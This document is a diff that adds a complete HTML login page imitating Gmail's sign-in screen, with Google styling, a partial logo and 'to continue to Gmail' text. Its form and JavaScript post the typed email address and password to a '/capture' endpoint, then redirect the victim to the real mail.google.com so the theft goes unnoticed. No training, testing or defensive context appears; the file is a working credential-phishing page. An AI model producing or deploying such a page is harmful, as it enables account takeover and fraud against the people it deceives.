@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail - Sign In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+        }
+        body {
+            background: #f1f3f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 48px 40px 36px;
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo svg {
+            width: 75px;
+            height: 24px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            color: #202124;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 32px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            transition: all 0.2s;
+        }
+        input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+        button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+        }
+        button:hover {
+            background: #1557b0;
+        }
+        .footer {
+            margin-top: 32px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .error {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        .spinner {
+            display: none;
+            margin: 20px auto;
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
+                <g fill="#EA4335">
+                    <path d="M67.954 4.474c-1.24 0-2.384.257-3.44.765-.86.414-1.62.98-2.27 1.68l.957.957c.56-.56 1.21-1.02 1.95-1.34.79-.33 1.65-.5 2.6-.5 1.53 0 2.8.48 3.63 1.34.86.86 1.34 2.02 1.34 3.63v1.5h-5.5c-2.13 0-3.76.57-4.9 1.67-1.14 1.1-1.67 2.5-1.67 4.2 0 1.7.53 3.1 1.67 4.2 1.14 1.1 2.77 1.67 4.9 1.67 1.53 0 2.86-.37 3.97-1.07 1.11-.7 1.97-1.68 2.58-2.86.61-1.18.93-2.52.93-4.02v-4.64c0-2.64-.77-4.7-2.27-6.14-1.5-1.44-3.53-2.16-6.06-2.16zm3.5 9.22v1.1c0 1.3-.3 2.4-.9 3.3-.6.9-1.5 1.4-2.6 1.4-1.2 0-2.1-.5-2.7-1.4-.6-.9-.9-2-.9-3.3v-1.1c0-1.3.3-2.4.9-3.3.6-.9 1.5-1.4 2.7-1.4 1.1 0 2 .5 2.6 1.4.6.9.9 2 .9 3.3z"/>
+                </g>
+            </svg>
+        </div>
+        <h1>Sign in</h1>
+        <div class="subtitle">to continue to Gmail</div>
+        
+        <form id="loginForm" method="POST" action="/capture">
+            <div class="input-group">
+                <input type="email" id="email" name="email" placeholder="Email or phone" required>
+                <div class="error" id="emailError">Please enter a valid email address</div>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                <div class="error" id="passwordError">Password is required</div>
+            </div>
+            <button type="submit" id="submitBtn">Next</button>
+            <div class="spinner" id="spinner"></div>
+        </form>
+        
+        <div class="footer">
+            <a href="#">Forgot email?</a> &nbsp;|&nbsp;
+            <a href="#">Forgot password?</a><br><br>
+            Not your computer? <a href="#">Use Guest mode</a>
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+            let valid = true;
+            
+            if (!email || !email.includes('@')) {
+                document.getElementById('emailError').style.display = 'block';
+                valid = false;
+            } else {
+                document.getElementById('emailError').style.display = 'none';
+            }
+            
+            if (!password) {
+                document.getElementById('passwordError').style.display = 'block';
+                valid = false;
+            } else {
+                document.getElementById('passwordError').style.display = 'none';
+            }
+            
+            if (valid) {
+                document.getElementById('submitBtn').style.display = 'none';
+                document.getElementById('spinner').style.display = 'block';
+                
+                fetch('/capture', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    body: 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password)
+                }).then(response => {
+                    window.location.href = 'https://mail.google.com';
+                });
+            }
+        });
+    </script>
+</body>
+</html>
